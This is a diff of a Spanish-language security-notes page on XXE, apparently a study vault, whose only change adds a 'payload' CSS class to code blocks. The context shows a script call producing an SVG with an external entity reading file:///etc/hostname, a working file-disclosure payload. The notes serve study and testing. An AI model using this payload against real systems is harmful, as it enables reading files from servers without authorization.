@@ -21,9 +21,9 @@ tags:
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
 Generá el SVG con el script (recurso parametrizable) → [[vulnerabilities/006-xxe/scripts/README|scripts/gen_svg_xxe.py]]:
-<pre><code>python gen_svg_xxe.py -r <mark>file:///etc/hostname</mark> -o xxe.svg</code></pre>
+<pre class="payload"><code>python gen_svg_xxe.py -r <mark>file:///etc/hostname</mark> -o xxe.svg</code></pre>
 Produce:
-<pre><code>&lt;?xml version="1.0" standalone="yes"?&gt;
+<pre class="payload"><code>&lt;?xml version="1.0" standalone="yes"?&gt;
 &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "<mark>file:///etc/hostname</mark>" &gt; ]&gt;
 &lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
      xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
